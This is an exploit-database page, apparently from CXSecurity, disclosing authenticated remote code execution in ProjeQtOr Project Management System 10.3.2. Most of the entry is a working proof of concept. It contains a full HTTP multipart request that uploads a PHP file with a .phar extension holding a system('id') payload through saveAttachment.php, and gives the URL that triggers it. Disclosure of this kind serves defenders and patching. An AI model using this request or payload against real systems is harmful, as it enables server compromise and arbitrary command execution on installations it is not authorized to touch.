---
title: ProjeQtOr Project Management System 10.3.2 Shell Upload
url: https://cxsecurity.com/issue/WLB-2023040077
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2023-04-24
fetch_date: 2025-10-04T11:31:23.860697
---

# ProjeQtOr Project Management System 10.3.2 Shell Upload

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **ProjeQtOr Project Management System 10.3.2 Shell Upload** **2023.04.23**  Credit:  **[Mirabbas Agalarov](https://cxsecurity.com/author/Mirabbas%2BAgalarov/1/)**  Risk: **High**  Local: **No**  Remote: ****Yes****  CVE: **N/A**  CWE: **[CWE-264](https://cxsecurity.com/cwe/CWE-264 "Click to see CWE-264")** | |

Exploit Title: ProjeQtOr Project Management System 10.3.2 -Remote Code Execution (RCE)
Application: ProjeQtOr Project Management System
Version: 10.3.2
Bugs: Remote Code Execution (RCE) (Authenticated) via file upload
Technology: PHP
Vendor URL: https://www.projeqtor.org
Software Link: https://sourceforge.net/projects/projectorria/files/projeqtorV10.3.2.zip/download
Date of found: 19.04.2023
Author: Mirabbas Ağalarov
Tested on: Linux
2. Technical Details & POC
========================================
Possible including php file with phar extension while uploading image. Rce is triggered when we visit again
Payload:<?php echo system("id"); ?>
poc request:
POST /projeqtor/tool/saveAttachment.php?csrfToken= HTTP/1.1
Host: localhost
Content-Length: 1177
sec-ch-ua: "Not?A\_Brand";v="8", "Chromium";v="108"
Accept: application/json
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryY0bpJaQzcvQberWR
X-Requested-With: XMLHttpRequest
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.125 Safari/537.36
sec-ch-ua-platform: "Linux"
Origin: http://localhost
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://localhost/projeqtor/view/main.php
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: currency=USD; PHPSESSID=2mmnca4p7m93q1nmbg6alskiic
Connection: close
------WebKitFormBoundaryY0bpJaQzcvQberWR
Content-Disposition: form-data; name="attachmentFiles[]"; filename="miri.phar"
Content-Type: application/octet-stream
<?php echo system("id"); ?>
------WebKitFormBoundaryY0bpJaQzcvQberWR
Content-Disposition: form-data; name="attachmentId"
------WebKitFormBoundaryY0bpJaQzcvQberWR
Content-Disposition: form-data; name="attachmentRefType"
User
------WebKitFormBoundaryY0bpJaQzcvQberWR
Content-Disposition: form-data; name="attachmentRefId"
1
------WebKitFormBoundaryY0bpJaQzcvQberWR
Content-Disposition: form-data; name="attachmentType"
file
------WebKitFormBoundaryY0bpJaQzcvQberWR
Content-Disposition: form-data; name="MAX\_FILE\_SIZE"
10485760
------WebKitFormBoundaryY0bpJaQzcvQberWR
Content-Disposition: form-data; name="attachmentLink"
------WebKitFormBoundaryY0bpJaQzcvQberWR
Content-Disposition: form-data; name="attachmentDescription"
------WebKitFormBoundaryY0bpJaQzcvQberWR
Content-Disposition: form-data; name="attachmentPrivacy"
1
------WebKitFormBoundaryY0bpJaQzcvQberWR
Content-Disposition: form-data; name="uploadType"
html5
------WebKitFormBoundaryY0bpJaQzcvQberWR--
visit: http://localhost/projeqtor/files/attach/attachment\_5/miri.phar

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2023040077)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 -1

0%

100%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top